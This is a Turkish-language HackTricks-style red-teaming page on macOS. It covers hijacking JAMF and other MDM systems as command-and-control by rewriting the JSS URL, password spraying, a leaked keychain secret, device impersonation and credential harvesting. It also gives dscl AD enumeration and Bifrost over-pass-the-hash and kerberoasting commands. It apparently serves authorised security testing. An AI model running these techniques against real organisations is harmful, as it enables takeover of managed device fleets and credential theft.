# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## MDM'leri Kötüye Kullanma

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Yönetim platformuna erişmek için **admin kimlik bilgilerini ele geçirmeyi** başarırsanız, malware'inizi makinelere dağıtarak **potansiyel olarak tüm bilgisayarları ele geçirebilirsiniz**.

MacOS ortamlarında Red Teaming yapmak için MDM'lerin nasıl çalıştığı hakkında bilgi sahibi olmanız şiddetle tavsiye edilir:


{{#ref}}
macos-mdm/
{{#endref}}

### MDM'yi C2 Olarak Kullanma

Bir MDM; profilleri yükleme, sorgulama veya kaldırma, uygulamalar yükleme, yerel admin hesapları oluşturma, firmware parolası belirleme, FileVault anahtarını değiştirme gibi izinlere sahip olur...

Kendi MDM'nizi çalıştırmak için **CSR'nizi bir vendor'a imzalatmanız** gerekir; bunu [**https://mdmcert.download/**](https://mdmcert.download/) üzerinden edinmeyi deneyebilirsiniz. Apple cihazları için kendi MDM'nizi çalıştırmak üzere [**MicroMDM**](https://github.com/micromdm/micromdm) kullanabilirsiniz.

Ancak enrolled bir cihaza uygulama yüklemek için uygulamanın hâlâ bir developer hesabı tarafından imzalanmış olması gerekir... Bununla birlikte, MDM enrolment sırasında **cihaz MDM'nin SSL cert'ini güvenilir bir CA olarak ekler**, böylece artık her şeyi imzalayabilirsiniz.<sup>[[4]](#references)</sup>

Cihazı bir MDM'ye enrol etmek için root olarak bir **`mobileconfig`** dosyası yüklemeniz gerekir; bu dosya bir **pkg** dosyası aracılığıyla teslim edilebilir (dosyayı zip içinde sıkıştırabilirsiniz; Safari'den indirildiğinde dosya açılır).

**Mythic agent Orthrus** bu tekniği kullanır.

### JAMF PRO'yu Kötüye Kullanma

JAMF, **custom scripts** (sysadmin tarafından geliştirilen script'ler), **native payloads** (yerel hesap oluşturma, EFI parolası belirleme, dosya/process monitoring...) ve **MDM** (cihaz konfigürasyonları, cihaz sertifikaları...) çalıştırabilir.<sup>[[5]](#references)</sup>

#### JAMF self-enrolment

**Self-enrolment özelliğinin etkin olup olmadığını** görmek için `https://<company-name>.jamfcloud.com/enroll/` gibi bir sayfaya gidin. Etkinse **erişim için kimlik bilgileri isteyebilir**.

Password spraying saldırısı gerçekleştirmek için [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) script'ini kullanabilirsiniz.

Ayrıca, geçerli kimlik bilgilerini bulduktan sonra aşağıdaki form ile diğer kullanıcı adlarını brute-force edebilirsiniz:

![JAMF PRO'yu Kötüye Kullanma - JAMF self-enrolment: Ayrıca, geçerli kimlik bilgilerini bulduktan sonra aşağıdaki form ile diğer kullanıcı adlarını brute-force edebilirsiniz](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binary'si, keychain'i açmak için gereken secret'ı içeriyordu; keşfedildiği sırada bu secret herkes arasında **paylaşılıyordu** ve değeri şuydu: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Ayrıca jamf, **`/Library/LaunchAgents/com.jamf.management.agent.plist`** konumunda bir **LaunchDaemon** olarak **persist** olur.

#### JAMF Device Takeover

**`jamf`** tarafından kullanılacak **JSS** (Jamf Software Server) **URL'si**, **`/Library/Preferences/com.jamfsoftware.jamf.plist`** konumunda bulunur.\
Bu dosya temelde URL'yi içerir:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Böylece bir saldırgan, kurulum sırasında **bu dosyanın üzerine yazan** kötü amaçlı bir paket (`pkg`) bırakabilir ve **URL'yi Typhon agent'ından bir Mythic C2 listener'a** ayarlayarak JAMF'ı C2 olarak kötüye kullanabilir.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Bir cihaz ile JMF arasındaki iletişimi **impersonate** etmek için şunlara ihtiyacınız vardır:

- Cihazın **UUID** değeri: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Şu konumdaki **JAMF keychain**: `/Library/Application\ Support/Jamf/JAMF.keychain`; bu dosya cihaz sertifikasını içerir

Bu bilgilerle, **çalınmış** Hardware **UUID** değerine sahip ve **SIP disabled** bir **VM oluşturun**, **JAMF keychain** dosyasını yerleştirin, Jamf **agent**'ını **hook** edin ve bilgilerini çalın.

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Ayrıca yöneticilerin Jamf üzerinden çalıştırmak isteyebileceği **custom script**'ler için `/Library/Application Support/Jamf/tmp/` konumunu izleyebilirsiniz; bu script'ler **buraya yerleştirilir, çalıştırılır ve kaldırılır**. Bu script'ler **credentials** içerebilir.

Ancak **credentials**, bu script'lere **parametre** olarak da aktarılabilir. Bu nedenle `ps aux | grep -i jamf` komutunu izlemeniz gerekir (root olmanıza bile gerek yoktur).

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) script'i, eklenen yeni dosyaları ve yeni process argument'lerini dinleyebilir.

### macOS Remote Access

Ayrıca **MacOS**'un "özel" **network** **protocol**'leri hakkında:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Bazı durumlarda **MacOS bilgisayarının bir AD'ye bağlı** olduğunu görürsünüz. Bu senaryoda, alışık olduğunuz şekilde active directory'yi **enumerate** etmeyi denemelisiniz. Aşağıdaki sayfalarda bazı **yardım** bulabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Size yardımcı olabilecek bazı **local MacOS tool**'ları `dscl`'dir:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Ayrıca AD'yi otomatik olarak enumerate etmek ve kerberos ile işlem yapmak için MacOS için hazırlanmış bazı tool'lar da vardır:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound, MacOS host'larındaki Active Directory ilişkilerinin toplanmasına ve içe aktarılmasına olanak tanıyan Bloodhound auditing tool'unun bir uzantısıdır.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost, macOS üzerindeki Heimdal krb5 API'leriyle etkileşim kurmak için tasarlanmış bir Objective-C projesidir. Projenin amacı, hedefte başka bir framework veya package gerektirmeden native API'leri kullanarak macOS cihazlarında Kerberos çevresinde daha iyi security testing yapılmasını sağlamaktır.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory enumeration yapmak için kullanılan bir JavaScript for Automation (JXA) tool'udur.

### Domain Bilgileri
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Kullanıcılar

MacOS kullanıcılarının üç türü vardır:

- **Yerel Kullanıcılar** — Yerel OpenDirectory service tarafından yönetilirler ve Active Directory'ye hiçbir şekilde bağlı değildirler.
- **Network Kullanıcıları** — Kimlik doğrulamak için DC server'a bağlantı gerektiren geçici Active Directory kullanıcılarıdır.
- **Mobile Kullanıcılar** — Kimlik bilgileri ve dosyaları için yerel bir yedeğe sahip Active Directory kullanıcılarıdır.

Kullanıcılar ve gruplar hakkındaki yerel bilgiler _/var/db/dslocal/nodes/Default._ klasöründe depolanır.\
Örneğin, _mark_ adlı kullanıcı hakkındaki bilgiler _/var/db/dslocal/nodes/Default/users/mark.plist_ dosyasında, _admin_ grubu hakkındaki bilgiler ise _/var/db/dslocal/nodes/Default/groups/admin.plist_ dosyasında depolanır.

HasSession ve AdminTo edge'lerini kullanmaya ek olarak, **MacHound Bloodhound database'e üç yeni edge ekler**:<sup>[[2]](#references)</sup>

- **CanSSH** - host'a SSH yapmasına izin verilen entity
- **CanVNC** - host'a VNC yapmasına izin verilen entity
- **CanAE** - host üzerinde AppleEvent script'lerini çalıştırmasına izin verilen entity
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Daha fazla bilgi için [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ parolası

Parolaları şunları kullanarak alın:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** parolasına System keychain içinden erişmek mümkündür.

### Over-Pass-The-Hash

Belirli bir kullanıcı ve servis için bir TGT alın:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGT toplandıktan sonra, mevcut oturuma şu şekilde enjekte edilebilir:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Elde edilen service ticket'larla diğer bilgisayarlardaki paylaşımlara erişmeyi denemek mümkündür:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Keychain'e Erişim

Keychain, bir prompt oluşturulmadan erişilmesi halinde bir red team çalışmasının ilerletilmesine yardımcı olabilecek hassas bilgiler içeriyor olabilir:


{{#ref}}
macos-keychain.md
{{#endref}}

## Harici Servisler

MacOS Red Teaming, normal bir Windows Red Teaming çalışmasından farklıdır; çünkü **MacOS genellikle doğrudan çeşitli harici platformlarla entegre edilmiştir**. Yaygın bir MacOS yapılandırması, bilgisayara **OneLogin ile senkronize edilmiş credentials kullanarak erişilmesini ve OneLogin üzerinden çeşitli harici servislere** (github, aws gibi) **erişilmesini** içerir.

## Çeşitli Red Team teknikleri

### Safari

Safari'de bir dosya indirildiğinde, dosya "güvenli" bir dosyaysa **otomatik olarak açılır**. Örneğin, bir **zip indirirseniz**, zip otomatik olarak açılır:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Referanslar

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
